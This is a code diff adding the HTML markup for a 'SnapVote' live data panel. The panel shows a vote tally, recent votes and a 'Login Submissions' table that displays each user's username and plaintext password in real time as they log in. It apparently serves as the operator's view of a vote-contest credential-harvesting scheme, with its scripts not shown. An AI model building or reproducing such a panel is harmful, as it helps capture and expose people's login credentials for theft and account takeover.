@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SnapVote — Live Data</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="app-shell results-shell">
+    <div class="card">
+      <div class="results-header">
+        <h1>Live Data Panel</h1>
+        <div class="live-badge">
+          <span class="live-dot"></span>
+          WebSocket · Real Time
+        </div>
+      </div>
+
+      <div class="feed-section">
+        <h2>Login Submissions</h2>
+        <p class="section-desc">Usernames and passwords appear here instantly as users log in.</p>
+        <div class="login-table-wrap">
+          <table class="login-table">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Time</th>
+              </tr>
+            </thead>
+            <tbody id="login-list">
+              <tr id="login-empty">
+                <td colspan="4" class="feed-empty">Waiting for logins…</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="feed-section">
+        <h2>Vote Tally</h2>
+        <div class="tally-list" id="tally-list"></div>
+      </div>
+
+      <div class="feed-section">
+        <h2>Recent Votes</h2>
+        <div class="feed-list" id="feed-list">
+          <p class="feed-empty" id="feed-empty">Waiting for votes…</p>
+        </div>
+      </div>
+
+      <p class="connection-status" id="connection-status">Connecting…</p>
+      <a href="#" class="back-link" id="back-link" hidden>← Back to contest</a>
+    </div>
+  </div>
+
+  <script src="config.js"></script>
+  <script src="ws.js"></script>
+  <script src="results.js"></script>
+</body>
+</html>
